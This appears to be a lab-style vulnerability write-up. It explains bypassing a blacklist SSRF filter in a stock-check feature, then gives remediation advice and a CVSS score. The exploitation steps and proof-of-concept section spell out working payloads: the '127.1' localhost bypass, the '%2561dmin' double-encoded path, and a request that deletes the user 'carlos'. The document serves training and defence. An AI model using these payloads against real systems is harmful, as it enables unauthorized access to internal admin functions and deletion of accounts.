# Title: SSRF: SSRF with blacklist-based input filter

## Description

The application is vulnerable to Server-Side Request Forgery (SSRF) through the stock check functionality. User-supplied URLs are fetched by the server without sufficient validation.

The application attempts to mitigate SSRF attacks using blacklist-based filtering mechanisms. Specifically, it blocks requests containing localhost references and administrative paths. However, the filtering logic is implemented incorrectly and can be bypassed using alternative IP representations and URL encoding techniques.

By exploiting these weaknesses, an attacker can access internal administrative functionality and perform privileged actions that should not be accessible externally.

---

## Steps to Exploit

### 1. Identify the Vulnerable Parameter

1. Navigate to any product page.
2. Click **Check Stock**.
3. Intercept the request using Burp Suite.

Example request:

```http
POST /product/stock HTTP/1.1

stockApi=http://stock.weliketoshop.net:8080/product/stock/check
```

Observe that the application retrieves stock information from a user-supplied URL.

---

### 2. Confirm SSRF Functionality

Modify the parameter:

```http
stockApi=http://127.0.0.1/
```

Forward the request.

The application blocks the request.

Example response:

```text
External stock check blocked
```

This indicates the presence of an input filter.

---

### 3. Bypass Localhost Filtering

Replace the localhost address with its shortened equivalent:

```http
stockApi=http://127.1/
```

Forward the request.

The application now processes the request successfully.

This demonstrates that the filter only checks specific string patterns rather than resolving the destination address properly.

---

### 4. Attempt Administrative Access

Modify the request:

```http
stockApi=http://127.1/admin
```

The application blocks the request.

This indicates that a second filter is attempting to prevent access to administrative endpoints.

---

### 5. Bypass Path Filtering

Obfuscate the `a` character in `/admin` using double URL encoding:

```http
stockApi=http://127.1/%2561dmin
```

During processing:

```text
%2561
↓
%61
↓
a
```

The backend resolves the path as:

```text
/admin
```

while the blacklist fails to detect the forbidden string.

---

### 6. Access the Administrative Interface

Forward the modified request.

The response contains the administrative interface.

Example:

```text
Admin Panel
Delete User
```

---

### 7. Delete the Target User

Modify the URL:

```http
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

Forward the request.

The user account is deleted successfully.

---

## Proof of Concept

### Blocked Request

```http
stockApi=http://127.0.0.1/admin
```

### Localhost Filter Bypass

```http
stockApi=http://127.1/
```

### Administrative Path Filter Bypass

```http
stockApi=http://127.1/%2561dmin
```

### Administrative Action

```http
stockApi=http://127.1/%2561dmin/delete?username=carlos
```

### Result

```text
User deleted successfully
```

The successful request confirms bypass of both blacklist protections.

---

## Impact

* Access to internal services and resources.
* Circumvention of SSRF protection mechanisms.
* Exposure of administrative functionality.
* Unauthorized execution of privileged actions.
* Potential compromise of backend infrastructure.
* Increased risk of lateral movement within internal networks.

---

## Mitigation / Remediation

### 1. Avoid Blacklist-Based Filtering

Do not rely on blacklists to block dangerous destinations.

Example ineffective checks:

```text
localhost
127.0.0.1
/admin
```

Attackers can easily bypass such filters using alternative encodings and representations.

---

### 2. Implement Allow-Listing

Restrict outbound requests to explicitly approved hosts.

Example:

```text
stock-api.company.internal
inventory.company.internal
```

Reject all other destinations.

---

### 3. Normalize Input Before Validation

Decode and canonicalize URLs before applying security checks.

Example process:

```text
URL Decode
Normalize
Validate
Process
```

---

### 4. Block Internal Address Ranges

Prevent access to:

```text
127.0.0.0/8
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
169.254.0.0/16
```

and other non-public networks.

---

### 5. Restrict Backend Network Access

Limit the application's ability to communicate with internal services unless explicitly required.

---

### 6. Perform SSRF Security Testing

Regularly assess applications for:

* Alternate IP representations
* URL encoding bypasses
* DNS rebinding
* Redirect-based SSRF
* Internal network access

---

## CVSS Score

**CVSS v3.1 Score:** 8.8 (High)

**Vector:**

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

---

## CVSS Justification

| Metric              | Value     | Justification                                          |
| ------------------- | --------- | ------------------------------------------------------ |
| Attack Vector       | Network   | Exploitable remotely through HTTP requests             |
| Attack Complexity   | Low       | Requires only URL manipulation and encoding tricks     |
| Privileges Required | None      | No authentication required                             |
| User Interaction    | None      | No victim interaction required                         |
| Scope               | Unchanged | Impact remains within the application's trust boundary |
| Confidentiality     | High      | Internal administrative resources become accessible    |
| Integrity           | High      | Administrative actions can be performed                |
| Availability        | None      | No direct service disruption observed                  |

---

## Conclusion

The application is vulnerable to Server-Side Request Forgery due to inadequate validation of user-supplied URLs. Blacklist-based protections can be bypassed using alternative IP address representations and double URL encoding techniques, allowing attackers to access internal administrative functionality and perform privileged actions. Proper URL canonicalization, allow-listing, and network restrictions are required to mitigate this vulnerability.
